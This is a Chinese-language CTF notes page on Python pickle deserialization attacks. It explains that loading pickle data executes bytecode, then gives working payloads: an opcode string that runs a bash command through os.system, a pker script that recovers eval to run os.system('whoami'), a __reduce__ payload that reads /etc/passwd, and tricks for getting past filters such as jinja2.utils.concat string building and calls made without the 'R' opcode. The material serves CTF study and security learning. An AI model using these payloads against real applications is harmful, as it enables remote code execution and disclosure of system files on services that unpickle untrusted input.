tags:: CTFWEB/Python

- > [参考](https://xz.aliyun.com/t/7012)
- # 原理
	- pickle数据实际上是字节码，加载pickle就是执行这串字节码
	- 我们可以通过构造恶意字节码来调用eval函数，实现RCE
- # 绕WAF
	- payload生成：[[CTFWEB/Python/Pickle/opcode]]
	- 字符串
		- pickle要想支持字符串拼接可以考虑拿到`builtins.getattr`
		- 需要RCE可以找找其他被import的函数
		- 字符串拼接函数在jinja2中有：`jinja2.utils.concat`
			- ```python
			  builtins_opcode = pickle_obj(
			      pickle_stack_global(pickle_string("BINSTRING", "jinja2.utils"), pickle_string("BINSTRING", "concat")),
			      [
			          pickle_tuple(
			              "TUPLE",
			              [pickle_string("BINSTRING", "built"), pickle_string("BINSTRING", "ins")],
			          )
			      ],
			  )
			  ```
		-
	- 字母`R`被禁用
		- 用GLOBAL找到危险函数并用OBJ调用
		- ```python
		  import pickle
		  import pickletools
		  
		  opcode=b'''(cos
		  system
		  S'bash -c "sleep 1"'
		  o.'''
		  pickletools.dis(opcode)
		  pickle.loads(opcode)
		  ```
	- 可以用[这个工具](https://github.com/EddieIvan01/pker)生成
		- 可以实现：
		  collapsed:: true
			- 变量赋值 存到 memo 中，保存 memo 下标和变量名即可
			- 函数调用
			- 类型字面量构造
			- list 和 dict 成员修改
			- 对象成员变量修改
		- ```shell
		  $ cat test/code_breaking
		  getattr = GLOBAL('builtins', 'getattr')
		  dict = GLOBAL('builtins', 'dict')
		  dict_get = getattr(dict, 'get')
		  globals = GLOBAL('builtins', 'globals')
		  builtins = globals()
		  __builtins__ = dict_get(builtins, '__builtins__')
		  eval = getattr(__builtins__, 'eval')
		  eval('__import__("os").system("whoami")')
		  return
		  
		  $ python3 pker.py < test/code_breaking
		  b'cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS\'get\'\ntRp2\n0cbuiltins\nglobals\np3\n0g3\n(tRp4\n0g2\n(g4\nS\'__builtins__\'\ntRp5\n0g0\n(g5\nS\'eval\'\ntRp6\n0g6\n(S\'__import__("os").system("whoami")\'\ntR.'
		  ```
- # Pickle文件OPCODE分析
	- `python -m pickletools pickle.pkl`
- # 基础
	- pickle支持
	  id:: 65af7fea-bc74-4284-97a3-e8fbebbd3614
		- 构造任意字符串、字节序列、数字、元组、列表、字典放入栈顶
		- 取全局变量放入栈顶
			- 可以取某模块中的对象，如`__main__.app`或者`jinja2.utils.concat`
		- 调用函数
		- 根据类创建对象
	- 把生成的 bytes 加载即可执行任意代码
	- 对象被 pickle 反序列化时，pickle 会调用对象的`__reduce__`方法（如果有）来获得反序列化的方法
	- ```python
	  #!/usr/bin/python2
	  import pickle
	  import urllib
	  class payload(object):
	      def __reduce__(self):
	         return (eval, ("open('/etc/passwd','r').read()",))
	  a = pickle.dumps(payload())
	  a = urllib.quote(a)
	  print(a)
	  ```
-